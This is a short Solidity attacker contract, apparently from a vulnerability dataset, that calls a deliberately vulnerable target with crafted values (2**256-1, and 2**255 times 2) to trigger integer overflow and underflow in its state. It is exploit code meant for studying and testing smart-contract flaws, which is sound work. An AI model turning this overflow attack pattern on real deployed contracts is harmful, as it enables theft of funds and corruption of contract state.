pragma solidity ^0.4.23;

import "../dataset/arithmetic/overflow_single_tx.sol";

contract IntegerOverflowSingleTransactionAttacker {
    IntegerOverflowSingleTransaction public target;

    function IntegerOverflowSingleTransactionAttacker(
        address _targetAddress
    ) public {
        target = IntegerOverflowSingleTransaction(_targetAddress);
    }

    function attackOverflowAddToState() public {
        uint256 largeNumber = 2 ** 256 - 1;
        target.overflowaddtostate(largeNumber);
    }

    function attackOverflowMulToState() public {
        uint256 largeNumber = 2 ** 255;
        target.overflowmultostate(largeNumber);
        target.overflowmultostate(2);
    }

    function attackUnderflowToState() public {
        uint256 number = 2;
        target.underflowtostate(number);
    }
}
